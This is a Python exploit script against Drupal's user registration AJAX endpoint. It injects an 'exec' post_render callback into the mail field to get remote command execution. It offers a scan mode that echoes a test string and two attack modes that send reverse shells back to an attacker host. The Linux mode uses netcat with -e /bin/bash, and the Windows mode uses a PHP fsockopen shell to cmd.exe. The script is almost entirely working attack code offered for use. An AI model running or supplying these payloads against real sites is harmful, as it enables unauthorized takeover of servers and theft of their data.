#!/usr/bin/env python3
import sys
import requests



##############################################################################################################################

def test_target(target):
        #getting the ip address to test and adding the path to the vulnerability
        target_url = target+ 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'

        try:
        #sending the malicious request along with a command to be executed by the RCE vulnerability
                r = requests.post(target_url, headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0;; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'}
                , data={"form_id": "user_register_form", "_drupal_ajax": "1", "mail[#post_render][]": "exec", "mail[#type]": "markup", "mail[#markup]": "echo 'haha'"})
                if r.status_code == 200:
                        response = r.content
                        #if the output of the command sent is in the response the target is vulnerable
                        if "haha" in response:
                                print ("[!] The target is vulnerable")
                else:
                        print ("[*] - Target not vulnerable")
        except:
                print ("[!] - Something went wrong")


##############################################################################################################################


def exploit_linux(target, lhost, lport):
   verify = False
   revshell ="nc %s %s -e /bin/bash"%(lhost,lport)
   #print(revshell)
   #defining the url of the malicious request but this time the command to execute sends a reverse shell
   url = target + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
   payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': revshell}
   #sending the request
   #print("check your listner")
   r = requests.post(url,data=payload,verify=verify)
   check = requests.get(target,verify=verify)
   if check.status_code != 200:
     sys.exit("Not exploitable")

##############################################################################################################################

def exploit_windows(target, lhost, lport):
   verify = False
   revshell ="php -r '$sock=fsockopen(\"%s\",%s);exec(\"cmd.exe <&3 >&3 2>&3\");'"%(lhost,lport)
   #defining the url of the malicious request but this time the command to execute sends a reverse shell
   url = target + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
   payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': revshell}
   #sending the request
   print("check your listner")
   r = requests.post(url,data=payload,verify=verify)
   check = requests.get(target,verify=verify)
   if check.status_code != 200:
     sys.exit("Not exploitable")

##############################################################################################################################


if len(sys.argv) > 2:
   if sys.argv[2] == "scan" :
      test_target(sys.argv[1])
      sys.exit()
elif len(sys.argv) < 2 :
      print ("\nUsage: " + sys.argv[0] + " <Target> <lhost> <lport> <os> exploit or "+sys.argv[0]+" <Target> scan\n")
      sys.exit()

if len(sys.argv) < 5:
    print ("\nUsage: " + sys.argv[0] + " <Target> <lhost> <lport> <os> exploit or "+sys.argv[0]+" <Target> scan\n")
    sys.exit()

elif sys.argv[5] == "exploit" :
    if(sys.argv[4] == "linux"):
      exploit_linux(sys.argv[1],sys.argv[2],sys.argv[3])
    elif(sys.argv[4] == "windows"):
      exploit_windows(sys.argv[1],sys.argv[2],sys.argv[3])

else : print("check if you spelled your everything correctly")
